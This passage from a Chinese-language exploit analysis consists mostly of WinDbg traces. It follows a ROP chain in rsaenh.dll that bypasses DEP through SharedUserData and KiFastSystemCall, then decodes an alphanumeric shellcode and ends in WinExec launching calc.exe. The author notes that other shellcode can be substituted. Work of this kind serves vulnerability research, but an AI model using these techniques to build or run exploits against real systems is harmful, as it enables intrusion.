    rsaenh!CPEncrypt+0x3d:
    68006e51 c22000          ret     20h
    0:009> p
    eax=68006e4f ebx=00fffbe8 ecx=680313c0 edx=00fff4f8 esi=680313c0 edi=680313c0
    eip=68006e4f esp=680313ec ebp=68006e4f iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    rsaenh!CPEncrypt+0x3b:
    68006e4f 5e              pop     esi
经过一系列ROP之后，会进入KiFastSystemCall，这是利用SharedUserData bypass DEP的一环。
    0:009> p
    eax=0000008f ebx=7ffe0300 ecx=680313c0 edx=00fff4f8 esi=68031460 edi=680124e3
    eip=680124e3 esp=68031400 ebp=6e6f3176 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    rsaenh!HmacCheck+0x2c3:
    680124e3 ff23            jmp     dword ptr [ebx]      ds:0023:7ffe0300={ntdll!KiFastSystemCall (7c8285e8)}
    0:009> p
    eax=0000008f ebx=7ffe0300 ecx=680313c0 edx=00fff4f8 esi=68031460 edi=680124e3
    eip=7c8285e8 esp=68031400 ebp=6e6f3176 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ntdll!KiFastSystemCall:
    7c8285e8 8bd4            mov     edx,esp
    0:009> p
    eax=0000008f ebx=7ffe0300 ecx=680313c0 edx=68031400 esi=68031460 edi=680124e3
    eip=7c8285ea esp=68031400 ebp=6e6f3176 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ntdll!KiFastSystemCall+0x2:
    7c8285ea 0f34            sysenter
    0:009> p
    eax=00000000 ebx=7ffe0300 ecx=00000001 edx=ffffffff esi=68031460 edi=680124e3
    eip=68031460 esp=68031404 ebp=6e6f3176 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    rsaenh!g_pfnFree+0x1a4:
    68031460 56              push    esi
    0:009> dc 68031460
    68031460  00560056 00410059 00340034 00340034  V.V.Y.A.4.4.4.4.
    68031470  00340034 00340034 00340034 00410051  4.4.4.4.4.4.Q.A.
之后进入alpha shellcode，这时候68031460作为shareduserdata，已经具备可执行权限。
    Failed to map Heaps (error 80004005)
    Usage:                  Image
    Allocation Base:        68000000
    Base Address:           68031000
    End Address:            68032000
    Region Size:            00001000
    Type:                   01000000    MEM_IMAGE
    State:                  00001000    MEM_COMMIT
    Protect:                00000040    PAGE_EXECUTE_READWRITE  有了可执行权限
这里由于url存入内存按照宽字节存放，因此都是以00 xx方式存放，因此不能单纯使用shellcode，而得用alpha
shellcode（结尾基友用了另一种方法执行shellcode，大家可以看下），alpha shellcode会先执行一段操作。随后进入解密部分。
    0:009> p
    eax=059003d9 ebx=7ffe0300 ecx=68031585 edx=68031568 esi=68031460 edi=680124e3
    eip=6803154e esp=68031400 ebp=6e6f3176 iopl=0         nv up ei ng nz ac po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000292
    rsaenh!g_pfnFree+0x292:
    6803154e 41              inc     ecx
    0:009> p
    eax=059003d9 ebx=7ffe0300 ecx=68031586 edx=68031568 esi=68031460 edi=680124e3
    eip=6803154f esp=68031400 ebp=6e6f3176 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    rsaenh!g_pfnFree+0x293:
    6803154f 004200          add     byte ptr [edx],al          ds:0023:68031568=e3
    0:009> p
    eax=059003d9 ebx=7ffe0300 ecx=68031586 edx=68031568 esi=68031460 edi=680124e3
    eip=68031552 esp=68031400 ebp=6e6f3176 iopl=0         nv up ei ng nz na po cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000283
    rsaenh!g_pfnFree+0x296:
    68031552 6b0110          imul    eax,dword ptr [ecx],10h ds:0023:68031586=00540032
    0:009> p
    eax=05400320 ebx=7ffe0300 ecx=68031586 edx=68031568 esi=68031460 edi=680124e3
    eip=68031555 esp=68031400 ebp=6e6f3176 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    rsaenh!g_pfnFree+0x299:
    68031555 024102          add     al,byte ptr [ecx+2]        ds:0023:68031588=54
    0:009> p
    eax=05400374 ebx=7ffe0300 ecx=68031586 edx=68031568 esi=68031460 edi=680124e3
    eip=68031558 esp=68031400 ebp=6e6f3176 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    rsaenh!g_pfnFree+0x29c:
    68031558 8802            mov     byte ptr [edx],al          ds:0023:68031568=bc
    0:009> p
    eax=05400374 ebx=7ffe0300 ecx=68031586 edx=68031568 esi=68031460 edi=680124e3
    eip=6803155a esp=68031400 ebp=6e6f3176 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    rsaenh!g_pfnFree+0x29e:
    6803155a 42              inc     edx
    0:009> p
    eax=05400374 ebx=7ffe0300 ecx=68031586 edx=68031569 esi=68031460 edi=680124e3
    eip=6803155b esp=68031400 ebp=6e6f3176 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    rsaenh!g_pfnFree+0x29f:
    6803155b 803941          cmp     byte ptr [ecx],41h         ds:0023:68031586=32
    0:009> p
    eax=05400374 ebx=7ffe0300 ecx=68031586 edx=68031569 esi=68031460 edi=680124e3
    eip=6803155e esp=68031400 ebp=6e6f3176 iopl=0         nv up ei ng nz na po cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000283
    rsaenh!g_pfnFree+0x2a2:
    6803155e 75e2            jne     rsaenh!g_pfnFree+0x286 (68031542)       [br=1]
    0:009> dd 68031580
    68031580  00380059 00320059 004d0054 004a0054
    68031590  00310054 0030004d 00370031 00360059
    680315a0  00300051 00300031 00300031 004c0045
    680315b0  004b0053 00300053 004c0045 00330053
可以看到，解密前，alpha shellcod部分，随后解密结束之后。
    0:009> p
    eax=04d0035d ebx=7ffe0300 ecx=68031592 edx=6803156c esi=68031460 edi=680124e3
    eip=6803155e esp=68031400 ebp=6e6f3176 iopl=0         nv up ei ng nz na pe cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287
    rsaenh!g_pfnFree+0x2a2:
    6803155e 75e2            jne     rsaenh!g_pfnFree+0x286 (68031542)       [br=1]
    0:009> bp 68031560
    0:009> g
    Breakpoint 2 hit
    eax=00000410 ebx=7ffe0300 ecx=680318da edx=6803163e esi=68031460 edi=680124e3
    eip=68031560 esp=68031400 ebp=6e6f3176 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    rsaenh!g_pfnFree+0x2a4:
    68031560 b8b726bfca      mov     eax,0CABF26B7h
    0:009> dd 68031580
    68031580  223cec9b 265a2caa 6a289c9c 9f7c5610
    68031590  90a91aa3 9f8f9004 beec8995 6120d015
    680315a0  60351b24 30b44661 a56b0c3a 4eb0584f
    680315b0  b3b04c03 65916fd3 87313668 9f7842bd
    680315c0  14326fa2 fcc51b10 c16ae469 05721746
    680315d0  7f01c860 44127593 5f97a1ee 840f2148
    680315e0  4fd6e669 089c4365 23715269 e474df95
shellcode已经被解密出来，随后会调用winexec，执行calc。
    0:009> p
    eax=77ea411e ebx=7ffe0300 ecx=68031614 edx=876f8b31 esi=68031460 edi=680124e3
    eip=680315f9 esp=680313fc ebp=68031581 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    rsaenh!g_pfnFree+0x33d:
    680315f9 51              push    ecx
    0:009> p
    eax=77ea411e ebx=7ffe0300 ecx=68031614 edx=876f8b31 esi=68031460 edi=680124e3
    eip=680315fa esp=680313f8 ebp=68031581 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    rsaenh!g_pfnFree+0x33e:
    680315fa ffe0            jmp     eax {kernel32!WinExec (77ea411e)}
    0:009> dd esp
    680313f8  68031614 68031633 00000001 00000000
    0:009> dc 68031633 l2
    68031633  636c6163 6578652e                    calc.exe
第二个参数是0x1，是SW_SHOWNORMAL，但由于服务无窗口，因此calc无法弹出。
其实，这个过程可以替换成其他的shellcode，相关的shellcode替换链接可以看我的好基友LCatro的几篇文章，都非常不错。
最后我想说，我在深圳，刚才和几个平时网上的好朋友吃夜宵，聊到这个漏洞，没想到在几个小时前认识的彭博士，就是这个漏洞的作者！真的没有想到，还好自己分析的这套思路和这个漏洞作者的思路相差无几，不然就被打脸了。真的很有缘！一下学到了好多。
这篇最后还是没有按时发出，不过希望能和大家一起学习！谢谢阅读！